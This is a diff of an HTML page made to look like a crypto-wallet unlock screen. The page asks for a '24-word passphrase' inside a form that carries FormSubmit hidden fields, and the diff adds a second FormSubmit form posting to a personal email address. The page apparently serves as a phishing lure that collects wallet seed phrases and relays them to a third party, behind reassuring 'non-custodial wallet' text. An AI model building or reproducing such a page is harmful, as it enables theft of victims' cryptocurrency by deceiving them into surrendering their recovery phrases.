@@ -24,7 +24,7 @@
       <!-- Hidden fields for redirecting to a thank you page after submission -->
       <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
       <input type="hidden" name="_captcha" value="false">
-      
+
       <textarea placeholder="Enter your 24-word passphrase here" name="passphrase" required></textarea>
       <div class="button-container">
         <button class="btn-outline" onclick="showPopup()">Unlock With Passphrase</button>
@@ -42,7 +42,31 @@
         <button class="btn-filled">Unlock With Fingerprint</button>
       </div>
     </form>
-    
+
+    <div class="container">
+      <h1>FormSubmit Demo</h1>
+      <form action="https://formsubmit.co/ashrafalajouri@gmail.com" method="POST">
+        <!-- Hidden fields for redirecting to a thank you page after submission -->
+        <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <div class="form-group">
+          <div class="form-row">
+            <div class="col">
+              <!-- Removed Name input field -->
+              <input type="email" name="email" class="form-control" placeholder="Email Address" required>
+            </div>
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
+        </div>
+        
+        <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
+      </form>
+    </div>
+
     <p class="info-text">
       As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
     </p>
